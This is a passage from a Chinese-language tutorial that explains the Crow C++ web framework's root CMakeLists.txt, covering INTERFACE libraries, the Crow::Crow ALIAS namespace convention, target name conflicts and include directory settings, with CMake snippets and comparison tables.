<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15.0 FATAL_ERROR)
project(Crow
    LANGUAGES CXX
    VERSION 1.1.1
)
</code></pre>
<ul>
<li><strong>作用</strong>：定义项目名称、语言和版本</li>
<li><strong>重要性</strong>：这是整个 CMake 构建树的根，所有子目录的 <code>CMAKE_SOURCE_DIR</code> 都指向这里</li>
</ul>
<h4 data-id="heading-4">1.2 CMake 模块路径配置</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Make sure Findasio.cmake module is found
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/cmake)
</code></pre>
<ul>
<li><strong>作用</strong>：将项目根目录下的 <code>cmake</code> 子目录添加到 CMake 模块搜索路径</li>
<li><strong>重要性</strong>：使得 CMake 能够找到项目自定义的模块，如 <code>Findasio.cmake</code> 和 <code>compiler_options.cmake</code></li>
<li><strong>依赖关系</strong>：<code>examples/CMakeLists.txt</code> 依赖这个配置来找到 <code>compiler_options.cmake</code></li>
</ul>
<h4 data-id="heading-5">1.3 核心库目标定义</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)

target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong>关键点分析</strong>：</p>
<ol>
<li>
<p><strong>INTERFACE 库</strong>：Crow 是一个 header-only 库，使用 <code>INTERFACE</code> 库类型，这意味着它不编译任何源文件，只提供接口（头文件路径、编译选项、链接库等）</p>
</li>
<li>
<p><strong>别名目标详解</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>语法解析</strong>：</p>
<ul>
<li><code>add_library()</code>：CMake 命令，用于创建库目标</li>
<li><code>Crow::Crow</code>：别名目标的名称（带命名空间前缀）</li>
<li><code>ALIAS</code>：关键字，表示这是一个别名，不是真正的库</li>
<li><code>Crow</code>：被别名的实际目标名称</li>
</ul>
<p><strong>核心作用</strong>：</p>
<ul>
<li><strong>加前缀防止弄混</strong>：为 <code>Crow</code> 目标添加 <code>Crow::</code> 命名空间前缀，避免与其他同名目标冲突</li>
<li><code>Crow</code> 和 <code>Crow::Crow</code> 指向同一个目标，可以互换使用</li>
<li>例如：<code>target_link_libraries(myapp Crow)</code> 和 <code>target_link_libraries(myapp Crow::Crow)</code> 效果相同</li>
</ul>
<p><strong>简单理解</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)           # 创建实际目标 "Crow"
add_library(Crow::Crow ALIAS Crow)    # 给 "Crow" 加个前缀 "Crow::"，变成 "Crow::Crow"
</code></pre>
<p>就像给文件加个文件夹前缀一样：</p>
<ul>
<li><code>Crow</code> → <code>Crow::Crow</code>（加个命名空间前缀）</li>
<li>防止和其他叫 <code>Crow</code> 的目标弄混</li>
</ul>
<p><strong>为什么不能直接创建带命名空间的目标？</strong></p>
<p>你可能会问：为什么不直接写 <code>add_library(Crow::Crow INTERFACE)</code> 呢？</p>
<p><strong>原因 1：CMake 语法限制</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># ❌ 不推荐：虽然语法上可以，但 CMake 会把 "Crow::Crow" 当作普通目标名
add_library(Crow::Crow INTERFACE)  # 这不是真正的命名空间，只是名字里带 "::"

# ✅ 推荐：先创建实际目标，再用 ALIAS 创建命名空间版本
add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)
</code></pre>
<p><strong>原因 2：ALIAS 的限制</strong></p>
<p>ALIAS 目标有一些限制，不能做某些操作：</p>
<ul>
<li>❌ 不能修改属性（如 <code>target_include_directories()</code>）</li>
<li>❌ 不能安装（<code>install(TARGETS ...)</code>）</li>
<li>❌ 不能导出（<code>install(EXPORT ...)</code>）</li>
<li>✅ 只能作为原目标的另一个名字</li>
</ul>
<p>所以实际的库配置必须在<strong>裸名字目标</strong>上完成：</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)  # ✅ 实际目标，可以配置属性
target_include_directories(Crow INTERFACE ...)  # ✅ 在裸名字目标上设置
target_link_libraries(Crow INTERFACE ...)       # ✅ 在裸名字目标上设置

add_library(Crow::Crow ALIAS Crow)  # ✅ 只是别名，指向上面的 Crow
</code></pre>
<p><strong>重要澄清：CMake 不会"隐藏"原目标</strong></p>
<p><strong>如果配置操作只能在裸名字上完成，那不会暴露裸名字吗？</strong></p>
<p><strong>答案：是的，会暴露！但这是 CMake 的设计，不是 bug。</strong></p>
<p><strong>实际情况</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 库提供者（Crow 项目）
add_library(Crow INTERFACE)                    # 裸名字目标
target_include_directories(Crow INTERFACE include/)  # 在裸名字上配置
add_library(Crow::Crow ALIAS Crow)            # 创建别名

# 库使用者（你的项目）
target_link_libraries(myapp Crow)        # ✅ 技术上可以，但不推荐
target_link_libraries(myapp Crow::Crow)  # ✅ 推荐使用命名空间版本
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li>
<p><strong>CMake 不会隐藏原目标</strong>：</p>
<ul>
<li><code>Crow</code> 和 <code>Crow::Crow</code> <strong>同时存在</strong>，都可以使用</li>
<li>这不是"隐藏"，而是"提供两个名字"</li>
<li>用户技术上可以使用 <code>Crow</code>，但最佳实践是使用 <code>Crow::Crow</code></li>
</ul>
</li>
<li>
<p><strong>这是命名约定，不是真正的封装</strong>：</p>
<ul>
<li>CMake 没有真正的"私有"目标概念</li>
<li>命名空间是<strong>约定</strong>，不是<strong>强制</strong></li>
<li>就像 C++ 的命名空间一样，技术上可以绕过，但遵循约定更好</li>
</ul>
</li>
<li>
<p><strong>为什么这样设计？</strong></p>
<p><strong>灵活性</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 项目内部可以使用裸名字（更简洁）
target_link_libraries(internal_lib Crow)  # ✅ 内部使用，更简洁

# 对外接口使用命名空间（更规范）
target_link_libraries(public_api Crow::Crow)  # ✅ 公共接口，更清晰
</code></pre>
<p><strong>向后兼容</strong>：</p>
<ul>
<li>如果完全隐藏裸名字，会破坏旧代码</li>
<li>允许两种方式，保持兼容性</li>
</ul>
<p><strong>实际需求</strong>：</p>
<ul>
<li>有些操作（如配置属性）必须在裸名字上完成</li>
<li>如果完全隐藏，这些操作就无法进行</li>
</ul>
</li>
</ol>
<p><strong>实际例子</strong>：</p>
<p>查看 Crow 项目的实际代码：</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # 裸名字，用于配置
target_include_directories(Crow INTERFACE ...)  # 在裸名字上配置
target_link_libraries(Crow INTERFACE asio::asio)  # 在裸名字上配置

add_library(Crow::Crow ALIAS Crow)  # 创建别名，提供命名空间版本
</code></pre>
<p>在 <code>examples/CMakeLists.txt</code> 中：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 所有示例都使用命名空间版本（最佳实践）
target_link_libraries(basic_example PUBLIC Crow::Crow)  # ✅ 推荐

# 技术上也可以使用裸名字（但不推荐）
# target_link_libraries(basic_example PUBLIC Crow)  # ⚠️ 不推荐，但可以工作
</code></pre>
<p><strong>对比其他语言</strong>：</p>
<p>这就像 C++ 的命名空间：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> crow {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// 可以使用完整命名空间</span>
crow::App app;  <span class="hljs-comment">// ✅ 推荐</span>

<span class="hljs-comment">// 也可以使用 using 声明</span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> crow;
App app;  <span class="hljs-comment">// ⚠️ 技术上可以，但不推荐（可能冲突）</span>
</code></pre>
<p>CMake 的命名空间也是类似的：</p>
<ul>
<li>推荐使用 <code>Crow::Crow</code>（清晰、不冲突）</li>
<li>技术上可以使用 <code>Crow</code>（简洁，但可能冲突）</li>
<li>这是约定，不是强制</li>
</ul>
<p><strong>最佳实践</strong>：</p>
<ol>
<li><strong>库提供者</strong>：
<ul>
<li>创建裸名字目标用于配置</li>
<li>创建命名空间别名用于对外接口</li>
<li>文档中推荐使用命名空间版本</li>
</ul>
</li>
<li><strong>库使用者</strong>：
<ul>
<li>总是使用命名空间版本（<code>Crow::Crow</code>）</li>
<li>避免使用裸名字（<code>Crow</code>），除非确定不会冲突</li>
</ul>
</li>
</ol>
<p><strong>总结</strong>：</p>
<ul>
<li>✅ <strong>会暴露</strong>：裸名字目标仍然可用</li>
<li>✅ <strong>这是设计</strong>：CMake 不隐藏原目标，提供灵活性</li>
<li>✅ <strong>这是约定</strong>：命名空间是约定，不是强制封装</li>
<li>✅ <strong>最佳实践</strong>：使用命名空间版本，避免冲突</li>
<li>⚠️ <strong>注意</strong>：技术上可以使用裸名字，但遵循约定更好</li>
</ul>
<p><strong>原因 3：设计清晰性</strong></p>
<p>分离实际目标和别名，职责更清晰：</p>
<ul>
<li><strong>裸名字目标</strong>（<code>Crow</code>）：负责实际的库配置和属性设置</li>
<li><strong>命名空间别名</strong>（<code>Crow::Crow</code>）：负责提供统一的公共接口</li>
</ul>
<p><strong>原因 4：兼容性和灵活性</strong></p>
<p>这种方式可以同时支持两种使用方式：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 项目内部可以使用裸名字（更简洁）
target_link_libraries(internal_lib Crow)  # ✅ 内部使用

# 对外提供命名空间版本（更规范）
target_link_libraries(public_api Crow::Crow)  # ✅ 公共接口
</code></pre>
<p><strong>实际例子对比</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># ❌ 错误方式：直接创建带命名空间的目标
add_library(Crow::Crow INTERFACE)  # ⚠️ CMake 政策 CMP0037 不允许
target_include_directories(Crow::Crow INTERFACE include/)  # ⚠️ 可能报错或警告

# ✅ 正确方式：先创建裸名字，再创建别名
add_library(Crow INTERFACE)
target_include_directories(Crow INTERFACE include/)  # ✅ 在裸名字上配置
add_library(Crow::Crow ALIAS Crow)  # ✅ 创建命名空间别名
</code></pre>
<p><strong>具体问题说明</strong>：</p>
<ol>
<li><strong>CMake 政策限制（CMP0037）</strong>：
<ul>
<li>CMake 规定：带 <code>::</code> 的目标名<strong>只能用于 ALIAS 或 IMPORTED 目标</strong></li>
<li>普通目标（如 <code>add_library(Crow::Crow INTERFACE)</code>）不能直接使用带 <code>::</code> 的名字</li>
<li>如果强制使用，CMake 可能会：
<ul>
<li>报错：<code>Target names may not contain a "::" unless it is an ALIAS or IMPORTED target</code></li>
<li>或者发出警告，取决于 CMake 版本和政策设置</li>
</ul>
</li>
</ul>
</li>
<li><strong>行为不确定</strong>：
<ul>
<li>即使某些 CMake 版本允许，这种行为也是未定义的</li>
<li>可能导致后续配置、安装、导出时出现问题</li>
<li>不同 CMake 版本可能有不同的处理方式</li>
</ul>
</li>
<li><strong>不符合最佳实践</strong>：
<ul>
<li>现代 CMake 明确要求：普通目标用裸名字，命名空间用 ALIAS</li>
<li>违反这个约定可能导致工具链、IDE 支持不佳</li>
</ul>
</li>
</ol>
<p><strong>实际测试</strong>：</p>
<p>如果你尝试直接创建带命名空间的目标，CMake 通常会报错：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">CMake <span class="hljs-keyword">Error</span>: Target names may <span class="hljs-built_in">not</span> contain a <span class="hljs-string">"::"</span> unless it <span class="hljs-built_in">is</span> an <span class="hljs-keyword">ALIAS</span> <span class="hljs-built_in">or</span> IMPORTED target.
</code></pre>
<p>或者在某些版本中会警告：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">CMake</span> <span class="hljs-type">Warning</span>: <span class="hljs-type">Target</span> <span class="hljs-string">"Crow::Crow"</span> contains <span class="hljs-string">"::"</span> but <span class="hljs-keyword">is</span> not an <span class="hljs-type">ALIAS</span> or <span class="hljs-type">IMPORTED</span> target.
</code></pre>
<p><strong>总结</strong>：</p>
<ul>
<li>必须先用裸名字创建实际目标（因为要配置属性）</li>
<li>然后用 ALIAS 创建命名空间版本（提供统一接口）</li>
<li>这是 CMake 的设计，也是最佳实践</li>
</ul>
<p><strong>历史原因和设计考量</strong>：</p>
<p>为什么不直接创建带命名空间的目标呢？<strong>如果可以直接创建带命名空间的目标，确实会更清晰</strong>！</p>
<pre><code class="hljs language-cmake" lang="cmake"># 理想情况（如果 CMake 支持）
add_library(Crow::Crow INTERFACE)  # 直接创建，一步到位，多清晰！
target_include_directories(Crow::Crow INTERFACE include/)
</code></pre>
<p>但现实是，CMake 的历史设计导致了这种"两步走"的方式：</p>
<p><strong>为什么 CMake 这样设计？</strong></p>
<ol>
<li><strong>历史演进</strong>：
<ul>
<li>CMake 早期（2.x 时代）没有命名空间概念</li>
<li>目标名就是简单的字符串，没有 <code>::</code> 的特殊含义</li>
<li>后来引入命名空间时，为了向后兼容，采用了 ALIAS 机制</li>
</ul>
</li>
<li><strong>技术限制</strong>：
<ul>
<li>CMake 的目标系统建立在对目标名的字符串匹配上</li>
<li>带 <code>::</code> 的名字需要特殊处理，区分"普通目标"和"命名空间目标"</li>
<li>为了保持系统一致性，限制普通目标不能直接用 <code>::</code></li>
</ul>
</li>
<li><strong>向后兼容性</strong>：
<ul>
<li>如果允许普通目标用 <code>::</code>，会破坏大量现有项目</li>
<li>需要区分"旧式目标"和"新式命名空间目标"</li>
<li>ALIAS 机制提供了一个平滑的过渡方案</li>
</ul>
</li>
</ol>
<p><strong>如果重新设计会怎样？</strong></p>
<p>理论上，如果 CMake 重新设计，可能会这样：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 理想设计（假设）
add_library(Crow::Crow INTERFACE)  # 直接创建命名空间目标
target_include_directories(Crow::Crow INTERFACE include/)
# 不需要 ALIAS，一步到位
</code></pre>
<p>这样确实更清晰，但现实是：</p>
<ul>
<li>CMake 已经是一个成熟、广泛使用的构建系统</li>
<li>改变这个设计会破坏大量现有项目</li>
<li>所以只能通过 ALIAS 机制来"模拟"命名空间</li>
</ul>
<p><strong>类比理解</strong>：</p>
<p>这就像编程语言中的一些"历史包袱"：</p>
<ul>
<li>C++ 的 <code>std::string</code> vs <code>string</code>（需要 <code>using namespace std</code>）</li>
<li>JavaScript 的 <code>var</code> vs <code>let/const</code>（历史原因导致多种声明方式）</li>
<li>Python 2 vs Python 3（为了改进，但需要兼容性考虑）</li>
</ul>
<p><strong>实际影响</strong>：</p>
<p>虽然设计上不够理想，但实际使用中：</p>
<ul>
<li>✅ 两行代码就能解决（<code>add_library</code> + <code>add_library ALIAS</code>）</li>
<li>✅ 已经成为标准做法，所有现代 CMake 项目都这样用</li>
<li>✅ 工具链、IDE 都很好地支持这种模式</li>
<li>⚠️ 确实有点"绕"，但这是历史原因，不是设计缺陷</li>
</ul>
<p><strong>结论</strong>：</p>
<p><strong>直接创建带命名空间的目标确实更清晰</strong>。但 CMake 的历史设计导致必须用"裸名字 + ALIAS"的方式。这是技术债务，但已经成为了事实标准。作为使用者，我们只能遵循这个约定，虽然它确实不够优雅。</p>
<p><strong>如果两个裸名字都叫 <code>Crow</code>，会冲突吗？</strong></p>
<p>这是一个很好的问题！答案是：<strong>会冲突，CMake 会报错</strong>。</p>
<p><strong>冲突场景 1：同一个项目中创建两个同名目标</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
add_library(Crow INTERFACE)  # 第一个 Crow
add_library(Crow STATIC crow.cpp)  # ❌ 第二个 Crow，会报错！
</code></pre>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>冲突场景 2：通过 add_subdirectory 引入同名目标</strong></p>
<pre><code class="hljs language-cmake" lang="cmake"># 主项目 CMakeLists.txt
add_library(Crow INTERFACE)
add_subdirectory(third_party/Crow)  # 子项目也创建了 Crow
</code></pre>
<p>如果子项目的 <code>CMakeLists.txt</code> 也创建了 <code>Crow</code> 目标，会冲突：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span>: add_library cannot create target <span class="hljs-string">"Crow"</span> because another
target <span class="hljs-keyword">with</span> the same name already exists.
</code></pre>
<p><strong>这就是为什么需要命名空间！</strong></p>
<p>使用命名空间可以避免冲突：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 主项目
add_library(MyCrow INTERFACE)
add_library(MyCrow::MyCrow ALIAS MyCrow)

# 子项目（第三方 Crow）
add_subdirectory(third_party/Crow)  # 内部创建 Crow 和别名Crow::Crow

# 现在可以同时使用，不会冲突！
target_link_libraries(myapp 
    MyCrow::MyCrow    # ✅ 主项目的 Crow
    Crow::Crow        # ✅ 第三方 Crow
)
</code></pre>
<p><strong>命名空间如何避免冲突？</strong></p>
<p>命名空间前缀让目标名变得唯一：</p>



































<table><thead><tr><th>场景</th><th>裸名字</th><th>命名空间版本</th><th>是否冲突？</th></tr></thead><tbody><tr><td>同一个项目</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>✅ 不冲突（不同名字）</td></tr><tr><td>不同项目</td><td><code>Crow</code></td><td><code>Crow::Crow</code></td><td>✅ 不冲突（不同名字）</td></tr><tr><td>两个 <code>Crow</code></td><td><code>Crow</code> vs <code>Crow</code></td><td>-</td><td>❌ 冲突！</td></tr><tr><td>两个命名空间</td><td><code>Crow::Crow</code> vs <code>MyCrow::Crow</code></td><td>-</td><td>✅ 不冲突（不同名字）</td></tr></tbody></table>
<p><strong>实际例子</strong>：</p>
<p>假设你的项目同时使用两个子目录的库，它们内部都创建了 <code>Crow</code> 目标：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 你的项目
add_subdirectory(libA)  # libA 内部：add_library(Crow INTERFACE)
add_subdirectory(libB)  # libB 内部：add_library(Crow INTERFACE)
# ❌ 冲突！两个 Crow 目标
</code></pre>
<p>但如果它们都使用命名空间：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 你的项目
add_subdirectory(libA)  # libA: add_library(Crow INTERFACE)
                        #      add_library(LibA::Crow ALIAS Crow)
add_subdirectory(libB)  # libB: add_library(Crow INTERFACE)
                        #      add_library(LibB::Crow ALIAS Crow)

# ✅ 不冲突！因为命名空间不同
target_link_libraries(myapp
    LibA::Crow   # ✅ 来自 libA
    LibB::Crow   # ✅ 来自 libB
)
</code></pre>
<p>虽然内部都有 <code>Crow</code> 裸名字目标，但：</p>
<ul>
<li>它们在不同的作用域中（不同的 <code>add_subdirectory</code>，在各自目录下是唯一的）</li>
<li>通过命名空间别名 <code>LibA::Crow</code> 和 <code>LibB::Crow</code> 区分</li>
<li>不会冲突</li>
</ul>
<p><strong>作用域规则</strong>：</p>
<p>CMake 的目标作用域：</p>
<ul>
<li>在同一个 <code>add_subdirectory</code> 作用域内，目标名必须唯一</li>
<li>不同作用域可以有同名目标（但通过命名空间区分更清晰）</li>
<li>全局作用域（根 CMakeLists.txt）的目标在整个项目可见</li>
</ul>
<p><strong>最佳实践</strong>：</p>
<ol>
<li>
<p><strong>总是使用命名空间别名</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">add_library(Crow INTERFACE)
add_library(Crow::Crow ALIAS Crow)  # ✅ 提供命名空间版本
</code></pre>
</li>
<li>
<p><strong>对外接口使用命名空间</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 对外提供命名空间版本
target_link_libraries(public_api Crow::Crow)  # ✅ 清晰、不冲突
</code></pre>
</li>
<li>
<p><strong>内部可以使用裸名字</strong>（如果确定不会冲突）：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 内部使用（如果确定唯一）
target_link_libraries(internal_lib Crow)  # ⚠️ 谨慎使用
</code></pre>
</li>
</ol>
<p><strong>总结</strong>：</p>
<ul>
<li>✅ <strong>会冲突</strong>：同一个作用域内两个同名裸名字目标会冲突</li>
<li>✅ <strong>命名空间避免冲突</strong>：<code>Crow::Crow</code> 和 <code>MyCrow::Crow</code> 是不同的名字，不冲突</li>
<li>✅ <strong>最佳实践</strong>：总是创建命名空间别名，对外使用命名空间版本</li>
<li>⚠️ <strong>注意</strong>：即使在不同作用域，使用命名空间也更清晰、更安全</li>
</ul>
<p><strong>为什么使用 <code>Crow::Crow</code> 命名空间格式？</strong></p>
<p>a. <strong>CMake 最佳实践</strong>：</p>
<ul>
<li>现代 CMake 推荐使用 <code>命名空间::目标名</code> 的格式</li>
<li>这是 CMake 3.x 引入的命名空间约定</li>
<li>许多第三方库都遵循这个约定（如 <code>asio::asio</code>、<code>OpenSSL::SSL</code>、<code>Boost::system</code>）</li>
</ul>
<p>b. <strong>安装兼容性</strong>：</p>
<ul>
<li>当项目安装后，通过 <code>find_package(Crow)</code> 导入时，通常会提供命名空间目标</li>
<li>使用命名空间格式可以保持构建时和安装后的一致性</li>
<li>用户代码可以统一使用 <code>Crow::Crow</code>，无需区分是构建时还是安装后</li>
</ul>
<p>c. <strong>避免名称冲突</strong>：</p>
<ul>
<li>命名空间可以避免与其他项目的目标名称冲突</li>
<li>例如，如果有另一个库也叫 <code>Crow</code>，使用 <code>Crow::Crow</code> 可以明确区分</li>
</ul>
<p>d. <strong>代码可读性</strong>：</p>
<ul>
<li><code>Crow::Crow</code> 明确表示这是 Crow 项目的 Crow 库</li>
<li>提高代码的可读性和可维护性</li>
</ul>
<p><strong>实际使用示例和好处对比</strong>：</p>
<p><strong>示例 1：代码一致性 - 构建时 vs 安装后</strong></p>
<p>场景：你的项目可能有两种使用 Crow 的方式</p>
<pre><code class="hljs language-cmake" lang="cmake"># 方式 A：作为子项目（构建时）
add_subdirectory(third_party/Crow)
target_link_libraries(myapp Crow::Crow)  # ✅ 使用命名空间

# 方式 B：通过 find_package（安装后）
find_package(Crow REQUIRED)
target_link_libraries(myapp Crow::Crow)  # ✅ 同样的写法！
</code></pre>
<p><strong>好处</strong>：无论 Crow 是作为子项目还是已安装的包，代码写法完全一致！</p>
<p><strong>示例 2：避免名称冲突</strong></p>
<p>假设你的项目同时使用多个库：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 项目同时使用 Crow 和另一个叫 "Crow" 的库（假设）
add_subdirectory(third_party/Crow)
add_subdirectory(third_party/OtherCrow)  # 另一个库也叫 Crow

# 使用命名空间 - 清晰明确
target_link_libraries(myapp 
    Crow::Crow        # ✅ 明确是 Crow 项目的库
    OtherCrow::Crow   # ✅ 明确是 OtherCrow 项目的库
)

# 不使用命名空间 - 容易混淆
target_link_libraries(myapp 
    Crow    # ❌ 这是哪个 Crow？
    Crow    # ❌ 冲突！CMake 会报错
)
</code></pre>
<p><strong>好处</strong>：命名空间避免了目标名称冲突，代码更清晰。</p>
<p><strong>示例 3：与第三方库风格一致</strong></p>
<p>在 Crow 项目中，可以看到所有依赖库都使用命名空间：</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt 中的实际代码
target_link_libraries(Crow INTERFACE
    asio::asio        # ✅ Asio 库使用命名空间
    ZLIB::ZLIB       # ✅ ZLib 库使用命名空间
    OpenSSL::SSL     # ✅ OpenSSL 库使用命名空间
)
</code></pre>
<p>在 examples 中，也使用命名空间：</p>
<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt 中的实际代码
target_link_libraries(basic_example PUBLIC Crow::Crow)  # ✅ 风格一致
</code></pre>
<p><strong>好处</strong>：代码风格统一，符合现代 CMake 最佳实践，提高可读性。</p>
<p><strong>示例 4：IDE 和工具支持更好</strong></p>
<p>使用命名空间的目标，IDE 和 CMake 工具能更好地识别：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 使用命名空间 - IDE 可以自动补全和检查
target_link_libraries(myapp Crow::Crow)  # ✅ IDE 知道这是 Crow 项目的目标

# 不使用命名空间 - 可能与其他目标混淆
target_link_libraries(myapp Crow)  # ❌ 可能是任何叫 Crow 的目标
</code></pre>
<p><strong>好处</strong>：更好的开发体验，工具支持更完善。</p>
<p><strong>示例 5：安装配置文件中的使用</strong></p>
<p>查看 <code>cmake/CrowConfig.cmake.in</code>（安装配置文件）：</p>
<pre><code class="hljs language-cmake" lang="cmake"># 第 28 行：获取 Crow::Crow 的属性
get_target_property(_CROW_ILL Crow::Crow INTERFACE_LINK_LIBRARIES)
get_target_property(_CROW_ICD Crow::Crow INTERFACE_COMPILE_DEFINITIONS)

# 第 52 行：设置 Crow::Crow 的属性
set_target_properties(Crow::Crow PROPERTIES
    INTERFACE_COMPILE_DEFINITIONS "${_CROW_ICD}"
)
</code></pre>
<p>安装后的包必须使用 <code>Crow::Crow</code>，如果构建时不使用命名空间，会导致：</p>
<ul>
<li>构建时用 <code>Crow</code></li>
<li>安装后用 <code>Crow::Crow</code></li>
<li>代码不一致，容易出错</li>
</ul>
<p><strong>好处</strong>：构建时和安装后使用相同的目标名称，避免混淆。</p>
<p><strong>总结对比表</strong>：</p>













































<table><thead><tr><th>特性</th><th>使用 <code>Crow::Crow</code></th><th>使用 <code>Crow</code></th></tr></thead><tbody><tr><td>构建时可用</td><td>✅ 是</td><td>✅ 是</td></tr><tr><td>安装后可用</td><td>✅ 是</td><td>❌ 可能不行</td></tr><tr><td>避免名称冲突</td><td>✅ 是</td><td>❌ 否</td></tr><tr><td>代码一致性</td><td>✅ 高</td><td>❌ 低</td></tr><tr><td>符合现代 CMake</td><td>✅ 是</td><td>❌ 否</td></tr><tr><td>IDE 支持</td><td>✅ 更好</td><td>⚠️ 一般</td></tr><tr><td>与第三方库风格一致</td><td>✅ 是</td><td>❌ 否</td></tr></tbody></table>
<p><strong>重要澄清：CMake 命名空间 vs C++ 命名空间</strong></p>
<p>⚠️ <strong>关键区别</strong>：CMake 的 <code>Crow::Crow</code> 命名空间和 C++ 代码中的命名空间是<strong>完全独立</strong>的，互不影响！</p>
<p><strong>CMake 命名空间</strong>（只在 CMakeLists.txt 中使用）：</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt 中
add_library(Crow::Crow ALIAS Crow)  # CMake 目标名称
target_link_libraries(myapp Crow::Crow)  # 链接时使用
</code></pre>
<p><strong>C++ 命名空间</strong>（在 C++ 源代码中使用）：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++ 源代码中</span>
<span class="hljs-keyword">namespace</span> crow {  <span class="hljs-comment">// C++ 命名空间（小写）</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> { ... };
}

<span class="hljs-comment">// 使用时</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>
crow::App app;  <span class="hljs-comment">// ✅ 使用 C++ 命名空间 crow（小写）</span>
</code></pre>
<p><strong>实际例子</strong>：</p>
<p>查看 <code>examples/example.cpp</code> 的实际代码：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"crow.h"</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    crow::App&lt;ExampleMiddleware&gt; app;  <span class="hljs-comment">// ✅ C++ 命名空间：crow（小写）</span>
    crow::json::wvalue x;              <span class="hljs-comment">// ✅ C++ 命名空间：crow（小写）</span>
    crow::request req;                 <span class="hljs-comment">// ✅ C++ 命名空间：crow（小写）</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>而在 <code>examples/CMakeLists.txt</code> 中：</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)  # ✅ CMake 命名空间：Crow::Crow（大写）
</code></pre>
<p><strong>两者对比</strong>：</p>



































<table><thead><tr><th>层面</th><th>CMake 命名空间</th><th>C++ 命名空间</th></tr></thead><tbody><tr><td>使用位置</td><td>CMakeLists.txt</td><td>.cpp/.h 源代码</td></tr><tr><td>格式</td><td><code>Crow::Crow</code>（大写）</td><td><code>crow</code>（小写）</td></tr><tr><td>作用</td><td>构建系统目标标识</td><td>代码组织、避免符号冲突</td></tr><tr><td>影响范围</td><td>构建配置</td><td>编译后的代码</td></tr><tr><td>是否相关</td><td>❌ 完全独立</td><td>❌ 完全独立</td></tr></tbody></table>
<p><strong>总结</strong>：</p>
<ul>
<li>CMake 的 <code>Crow::Crow</code> 只影响构建系统，不影响 C++ 代码</li>
<li>C++ 代码中的 <code>namespace crow</code> 是库的编程接口，与 CMake 无关</li>
<li>你可以使用 <code>Crow::Crow</code>（CMake）链接库，然后在代码中使用 <code>crow::App</code>（C++）</li>
<li>两者可以有不同的命名风格，互不干扰</li>
</ul>
</li>
<li>
<p><strong>包含目录详解</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow
    INTERFACE
        $&lt;BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include&gt;
        $&lt;INSTALL_INTERFACE:include&gt;
)
</code></pre>
<p><strong><code>target_include_directories</code> 的本质</strong>：</p>
<p><strong>核心作用</strong>：告诉编译器在哪里找头文件</p>
<p><code>target_include_directories</code> 的本质是<strong>设置编译器的头文件搜索路径</strong>。它会在编译时转换为编译器的 <code>-I</code> 选项（GCC/Clang）或 <code>/I</code> 选项（MSVC）。</p>
<p><strong>从 CMake 到编译器的转换</strong>：</p>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
target_include_directories(Crow INTERFACE include/)
</code></pre>
<p>转换为实际的编译器命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GCC/Clang</span>
g++ -I/path/to/include -c example.cpp

